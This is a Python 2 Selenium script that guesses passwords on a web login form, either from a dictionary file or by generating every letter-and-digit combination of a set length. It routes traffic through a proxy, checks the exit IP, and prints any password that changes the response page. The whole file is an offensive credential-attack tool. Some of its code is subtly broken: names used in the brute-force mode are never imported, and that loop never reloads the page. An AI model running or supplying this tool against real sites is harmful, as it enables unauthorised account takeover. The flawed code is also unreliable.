import argparse
import time
from itertools import product
import selenium
from selenium import webdriver
from selenium.webdriver.firefox.firefox_binary import FirefoxBinary
from selenium.webdriver.common.proxy import *

# Options

parser = argparse.ArgumentParser()
parser.add_argument("--dictionary", help="Password dictionary")
parser.add_argument("--url", help="Login form URL")
parser.add_argument("--input", help="Form's input name")
parser.add_argument("--bruteforce", help="No. of characters", default=4)
parser.add_argument("--proxy", help="http proxy (without the http://)", default="127.0.0.1:8118")
args = parser.parse_args()

# Print selections

if args.dictionary:
    print "[*] Using dictionary: " + args.dictionary
else:
    print "[*] Using bruteforce with %s char length " % args.bruteforce

print "[*] URL: " + args.url
print "[*] Proxy: http://" + args.proxy

# Configure browser

profile = webdriver.FirefoxProfile()
profile.set_preference("javascript.enabled", True)

proxy = Proxy({
    'proxyType': ProxyType.MANUAL,
    'httpProxy': args.proxy,
    'ftpProxy': args.proxy,
    'sslProxy': args.proxy,
    'noProxy': ''
})

binary = FirefoxBinary('/home/fsalido/Descargas/firefox/firefox')
driver = webdriver.Firefox(firefox_binary=binary, proxy=proxy, firefox_profile=profile)
driver.get("http://ipecho.net/plain")

print "[*] Exiting through: " + driver.page_source

# Get an invalid response

print "[*] Go to: " + args.url
driver.get(args.url)
print "[*] Input name='" + args.input + "'"
password = driver.find_element_by_name(args.input)
password.send_keys("0")
password.submit()
print "[*] Get invalid response:\n\n"
print "\n\n-----------------------[invalid response]-----------------------\n\n"
invalid_response = driver.page_source
print invalid_response
print "\n\n---------------------[end invalid response]---------------------\n\n"

# Password try

# driver.get(args.url)
# password = driver.find_element_by_name(args.input)
# print "[*] Trying password: " + "fistropecador"
# password.send_keys("fistropecador")
# password.submit()
# if invalid_response != driver.page_source:
#     print "[+] SUCCESS! The password is: " + pwd
# driver.close()

# Using dictionary
if args.dictionary:
    with open(args.dictionary, 'r') as pwds:
        for pwd in pwds:
            try:
                driver.get(args.url)
                password = driver.find_element_by_name(args.input)
                print "[*] Trying password: " + pwd.strip()
                password.send_keys(pwd)
                password.submit()
                if invalid_response != driver.page_source:
                    print "\033[34m[+] SUCCESS!\033[0m The password is: " + pwd.strip()
                    break
            except Exception as e:
                print "[!] ERROR: " + type(e).__name__

# Using bruteforce
else:
    print "[*] Generating all %s letters passwords..." % args.bruteforce
    pwds = [''.join(i) for i in product(ascii_letters+digits, repeat=int(args.bruteforce))]
    print "[*] %s passwords have been created " % len(pwds)
    for pwd in pwds:
        try:
            password = driver.find_element_by_name(args.input)
            print "[*] Trying password: " + pwd.strip()
            password.send_keys(pwd)
            password.submit()
            if invalid_response != driver.page_source:
                print "\033[34m[+] SUCCESS!\033[0m The password is: " + pwd.strip()
                break
        except:
            pass

driver.close()